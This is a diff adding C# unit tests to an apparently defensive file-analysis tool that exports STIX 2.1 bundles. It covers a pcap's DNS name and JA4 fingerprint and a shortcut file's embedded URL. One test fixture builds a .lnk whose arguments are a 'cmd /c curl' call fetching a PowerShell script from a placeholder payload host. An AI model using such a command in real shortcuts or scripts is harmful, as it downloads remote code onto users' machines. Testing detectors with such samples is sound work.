@@ -134,4 +134,32 @@ public sealed class StixBundleTests : IDisposable
         Assert.Equal(ErrorCode.Conflict, refused.Code);
         Assert.Contains("STIX 2.1 bundle written to", await tools.SummarizeFile(path: path, stixPath: stix, overwrite: true));
     }
+
+    [Fact]
+    public void A_capture_bundle_validates_and_holds_its_names_and_TLS_fingerprints()
+    {
+        var path = _dir.File("a.pcap");
+        File.WriteAllBytes(path, PcapTests.Pcap(PcapTests.EthernetFrames()));
+        var bytes = Bundle(path);
+        AssertValid(bytes);
+        var objects = Objects(bytes);
+        var domain = objects.Single(o => o.GetProperty("type").GetString() == "domain-name" && o.GetProperty("value").GetString() == "api.example.com");
+        Assert.Equal("api.example.com", domain.GetProperty("value").GetString());
+        Assert.Equal("pcap: DNS query", domain.GetProperty("x_corvus_locations")[0].GetString());
+        var ja4 = objects.Single(o => o.GetProperty("type").GetString() == "x-tls-fingerprint" && o.GetProperty("algorithm").GetString() == "JA4");
+        Assert.Equal("t12d0103h2_0f2cb44170f4_4298e3b3ed58", ja4.GetProperty("value").GetString());
+        Assert.DoesNotContain("not checked", objects.Single(o => o.GetProperty("type").GetString() == "malware-analysis").GetProperty("description").GetString());
+    }
+
+    [Fact]
+    public void A_shortcut_bundle_holds_the_URL_of_its_arguments()
+    {
+        var path = _dir.File("a.lnk");
+        File.WriteAllBytes(path, ShellLinkTests.Shortcut("/c curl http://payload.example.net/a.ps1"));
+        var bytes = Bundle(path);
+        AssertValid(bytes);
+        var url = Objects(bytes).Single(o => o.GetProperty("type").GetString() == "url");
+        Assert.Equal("http://payload.example.net/a.ps1", url.GetProperty("value").GetString());
+        Assert.Equal("lnk: arguments", url.GetProperty("x_corvus_locations")[0].GetString());
+    }
 }
